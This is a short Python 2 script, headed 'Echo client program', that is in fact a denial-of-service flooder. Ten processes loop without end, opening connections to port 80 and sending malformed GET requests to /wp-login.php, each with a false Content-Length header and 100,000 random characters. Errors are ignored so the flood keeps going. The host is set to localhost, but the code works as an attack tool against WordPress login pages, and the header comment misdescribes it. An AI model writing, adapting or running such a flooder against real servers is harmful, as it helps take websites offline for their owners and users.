# Echo client program
import socket
import random
import string
import time
import multiprocessing


def connect():
    while True:
        try:
            HOST = '127.0.0.1'
            PORT = 80
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            N = 100000
            ptr = string.ascii_uppercase + string.digits
            ptr += "!@#$%^&*()_+`-~"
            request = 'GET /wp-login.php HTTP/1.1'
            request += '\r\n'
            request += 'Content-Type: text/html'
            request += '\r\n'
            request += 'Content-Length: 75'
            request += '\r\n'
            request += '\r\n'
            request += ''.join(random.choice(ptr) for _ in range(N))
            s.send(request)
            print "-",
        except:
            print "!",


if __name__ == '__main__':
    multiprocessing.freeze_support()
    processes = []
    for i in range(10):
        processes.append(multiprocessing.Process(
            target=connect,
            args=()
            )
        )
    for i in range(len(processes)):
        processes[i].start()
    for i in range(len(processes)):
        processes[i].join()
    time.sleep(100)
